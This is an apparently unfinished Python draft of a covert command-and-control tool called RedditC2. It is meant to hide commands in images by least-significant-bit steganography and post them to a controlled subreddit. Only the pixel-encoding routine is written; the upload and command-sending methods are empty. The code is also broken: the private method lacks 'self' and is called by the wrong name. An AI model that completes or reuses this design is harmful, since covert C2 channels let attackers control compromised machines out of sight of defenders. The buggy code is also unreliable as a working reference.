import requests
import base64
from PIL import Image
import numpy as np

# encode text
text = "Hello world"
image_path = "server/forest.png"

 # this class will contain the write_message_to_image, the authkey, target subreddit, upload_to_subreddit
class RedditC2:
    def __init__(self,subreddit,authkey):
        self.subreddit = subreddit
        self.authkey = authkey
    
    def __upload_to_subreddit(self):
        pass


    def __write_message_to_image(text,image_path):
        # converts text to binary and concats into an array full of ints
        binary_message = "".join([bin(letter)[2:].zfill(8) for letter in text.encode("utf-8")])
        binary_message = [int(i) for i in binary_message]
        binary_message_len = len(binary_message)

        #get image pixels as array
        with Image.open(image_path) as img:
            width,height = img.size
            data = np.array(img)

        # flatten pixel array
        data = np.reshape(data, width*height*3)

        #overwrite lsb
        data[:binary_message_len] = (data[:binary_message_len] & 254) | binary_message

        #reshape back into image pixel array
        data = np.reshape(data, (height, width, 3))

        # reconstruct image
        new_img = Image.fromarray(data)
        new_img.save(image_path)
        return True # means success and that the rest of the program can carry on.


    # This is where the code which will get a random image, save it, save the command in the image,
    # then upload it to a controlled subreddit using authkey/apikey idk yet. Uses private funcs
    def send_command(self,command):
        pass


# Mot sure if this func is needed 
# but may be in the future.
#def create_account():
#    pass
#
#def create_subreddit():
#    pass


c2 = RedditC2("","")
c2.write_message_to_image("ping google.com", "/home/mikolaj/Documents/python/twitter_c2/server/forest.png")